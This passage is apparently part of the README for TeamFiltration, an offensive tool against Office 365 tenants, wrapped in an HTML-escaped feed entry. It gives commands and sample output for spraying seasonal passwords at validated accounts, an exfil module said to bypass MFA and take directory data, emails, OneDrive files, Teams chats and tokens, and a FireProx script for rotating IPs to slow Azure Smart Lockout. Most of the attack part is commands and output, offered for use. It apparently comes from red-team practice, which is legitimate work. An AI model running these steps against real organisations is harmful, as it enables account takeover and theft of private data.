valid!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Next up we will spray the validated emails with the following command&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt; TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When no passwords list is provided, TeamFiltration will generate its own based on the Month, Season, and year! If you would like to supply your own passwordlist, simply use the --passwords argument.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[♥] TeamFiltration V0.3.2.6, created by @Flangvik&#xA;[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 &#xA;[SPRAY] 24.05.2021 12:33:54 EST Sleeping between 60-100 minutes for each round&#xA;[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed renita.lintz@legitcorp.net:Spring2021!          =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed bruce.wayne@legitcorp.net:Spring2021!           =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed herminia.oliva@legitcorp.net:Spring2021!        =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed biff.tannen@legitcorp.net:Spring2021!           =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed elijah.blakley@legitcorp.net:Spring2021!        =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed thomas.anderson@legitcorp.net:Spring2021!       =&amp;gt; VALID NO MFA!&#xA;[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed chris.kelly@legitcorp.net:Spring2021!           =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed deadpool@legitcorp.net:Spring2021!              =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:34:00 EST Sprayed sharilyn.penning@legitcorp.net:Spring2021!      =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed master.kevin@legitcorp.net:Spring2021!          =&amp;gt; INVALID&#xA;[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed adam.wally@legitcorp.net:Spring2021!            =&amp;gt; INVALID&#xA;[SPRAY] 24.05.2021 12:34:01 EST Sleeping 78 before next spray&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With a set of valid credentials found, we can move into the exfil module. The valid credentials and account information is stored in the teamfiltration database, so you do not need to provide them when using the --exfil module.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt; TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --exfil --aad&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will attempt to bypass any MFA, and if successful, exfiltrate information from resources accessible within o365. The --aad or Azure Active Directory plugin will attempt to exfiltrate all users, groups, and domains from the o365 tenant. All new users will automatically be added to the database as valid users.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[♥] TeamFiltration V0.3.2.6, created by @Flangvik&#xA;[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --exfil --aad&#xA;[+] You can select multiple users using syntax 1,2,3 or 1-3&#xA;    |-&amp;gt; 0 - thomas.anderson@legitcorp.net&#xA;    |-&amp;gt; ALL - Everyone!&#xA;&#xA;[?] What user to target ? #&amp;gt; 0&#xA;[EXFIL] 24.05.2021 12:35:43 EST Attempting to exfiltrate using provided token&#xA;[EXFIL] 24.05.2021 12:35:44 EST Refreshed a token for =&amp;gt; https://outlook.office365.com&#xA;[EXFIL] 24.05.2021 12:35:45 EST Refreshed a token for =&amp;gt; https://api.spaces.skype.com&#xA;[EXFIL] 24.05.2021 12:35:45 EST Cross-resource-refresh allowed, we can exfil all that things!&#xA;[EXFIL] 24.05.2021 12:35:53 EST Refreshed a token for =&amp;gt; https://graph.windows.net&#xA;[EXFIL] 24.05.2021 12:35:54 EST Refreshed a token for =&amp;gt; https://graph.microsoft.com&#xA;[EXFIL] 24.05.2021 12:35:54 EST Exfiltrating AAD users and groups via MS AD Graph API&#xA;[EXFIL] 24.05.2021 12:35:58 EST Exfiltrating AAD users and groups via MS graph API&#xA;[EXFIL] 24.05.2021 12:35:59 EST Got 133 AAD users, appending to database as valid users!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With those new valid accounts added, we can go back to the spraying module and successfully hit all the accounts in the domain.&lt;/p&gt; &#xA;&lt;p&gt;You can also exfiltrate Emails + Attachments, OneDrive files, Teams Chat Logs + Attachments, and raw JWT tokens using different exfil plugins as shown in the --help menu.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;         --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)&#xA;         --aad                 Exfiltrate information from Graph API (domain users and groups)&#xA;         --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)&#xA;         --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the users entire OneDrive directory)&#xA;         --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)&#xA;               --owa-limit     Set the max amount of emails to exfiltrate, default is 2k.&#xA;         --tokens              Exfiltrate JSON formated JTW-tokens for SSO resources (MsGraph,AdGraph, Outlook, SharePoint, OneDrive, Teams)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;TeamFiltration Configruation&lt;/h2&gt; &#xA;&lt;p&gt;Below is an example TeamFiltration config file, the configuration file needs to be supplied everytime you run TeamFiltration, using the --config argument.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{&#xA;    &#34;pushoverAppKey&#34;: &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;,&#xA;    &#34;pushoverUserKey&#34;: &#34;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&#34;,&#xA;    &#34;msolFireProxEndpointsUs&#34;: [&#34;https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token&#34;,&#34;https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token&#34;],&#xA;    &#34;msolFireProxEndpoints&#34;: [&#34;https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token&#34;,&#34;https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token&#34;],&#xA;    &#34;teamsEnumFireProxEndpoints&#34;: [&#34;https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/&#34;,&#34;https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/&#34;],&#xA;    &#34;aadSSoFireProxEndpoints&#34;: [&#34;https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox&#34;,&#34;https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox&#34;],&#xA;    &#34;sacrificialO365Username&#34;: &#34;mr.andersen@matrix.com&#34;,&#xA;    &#34;sacrificialO365Passwords&#34;: &#34;TheChooenOne123!&#34;,&#xA;      &#34;dehashedApiKey&#34;: &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;, &#xA;&#x9;&#34;dehashedEmail&#34; : &#34;bruce.wayne@batcave.com&#34;,&#xA;    &#34;proxyEndpoint&#34;: &#34;http://127.0.0.1:8080&#34;&#xA;  }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;pushoverAppKey&lt;/code&gt; This is your Pushover Application Token / API Token (Optional).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;pushoverUserKey&lt;/code&gt; This is your Pushover Application User Key / User Token (Optional).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;msolFireProxEndpointsUs&lt;/code&gt; An string array of fireprox endpoints generated to be pointing at -&amp;gt; &lt;code&gt;https://login.microsoftonline.us/&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;msolFireProxEndpoints&lt;/code&gt; An string array of fireprox endpoints generated to be pointing at -&amp;gt; &lt;code&gt;https://login.microsoftonline.com/&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;teamsEnumFireProxEndpoints&lt;/code&gt; An string array of fireprox endpoints generated to be pointing at -&amp;gt; &lt;code&gt;https://teams.microsoft.com/api/mt/&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;aadSSoFireProxEndpoints&lt;/code&gt; An string array of fireprox endpoints generated to be pointing at -&amp;gt; &lt;code&gt;TO BE UPDATED UPDATE&lt;/code&gt; (Optional).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;sacrificialO365Username&lt;/code&gt; The username / email for the sacrificial Office365 account used for perfoming enumeration using the Teams API method. (Optional, but cannot have MFA / Conditional access enabled, dohh)&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;sacrificialO365Passwords&lt;/code&gt; The password for the sacrificial Office365 account used for perfoming enumeration using the Teams API method. (Optional).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;dehashedApiKey&lt;/code&gt; Your Dehashed API key for auth (Optional).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;dehashedEmail&lt;/code&gt; Your Dehashed Account Email key for auth (Optional).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;proxyEndpoint&lt;/code&gt; HTTP endpoint used for inspecting traffic / debugging purposes, eg Burp,MitMProxy etc.&lt;/p&gt; &#xA;&lt;h3&gt;Generate FireProx URLs&lt;/h3&gt; &#xA;&lt;p&gt;TeamFiltration heavily uses FireProx url in order to slow Azure Smart Lockout down, the more URL&#39;s the better. Follow the instructions below in order to generate FireProx URL&#39;s for your own Config&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/ustayready/fireprox&#xA;cd fireprox&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Create the following bash script inside the folder!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;#!/bin/bash&#xA;# create_fireprox_instances.sh&#xA;# Possible AWS regions&#xA;array=( us-east-1 us-west-1 us-west-2 ca-central-1 eu-central-1 eu-west-1 eu-west-2 eu-west-3 eu-north-1 )&#xA;&#xA;#Endpoint to be proxied&#xA;$url=&#34;https://login.microsoftonline.com/&#34;&#xA;&#xA;#Switch out to generate with these&#xA;#url=&#34;https://login.microsoftonline.us/&#34;&#xA;#url=&#34;https://teams.microsoft.com/api/mt/&#34;&#xA;&#xA;#generate them all&#xA;for i in &#34;${array[@]}&#34;&#xA;do&#xA;        python3 fire.py --access_key &amp;lt;AWS-ACCESS-KEY&amp;gt; --secret_access_key &amp;lt;AWS-SECRET-KEY&amp;gt; --region $i --command create --url $url&#xA;done&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Run the bash script multiple times in order to generate url&#39;s for the **FireProxEndpoints properties in the JSON config file.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/KoenZomers/OneDriveAPI&#34;&gt;GitHub - KoenZomers/OneDriveAPI: API in .NET to communicate with OneDrive Personal and OneDrive for Business&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/secureworks/family-of-client-ids-research&#34;&gt;Research into Undocumented Behavior of Azure AD Refresh Tokens &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Credits to [Ryan] (&lt;a href=&#34;https://twitter.com/detectdotdev%5D&#34;&gt;https://twitter.com/detectdotdev]&lt;/a&gt; for validating and discussing my observations / questions!&lt;/li&gt; &#xA; &lt;li&gt;The entire &lt;a href=&#34;https://TrustedSec.com&#34;&gt;TrustedSec&lt;/a&gt; team for helping me polish this tool!&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>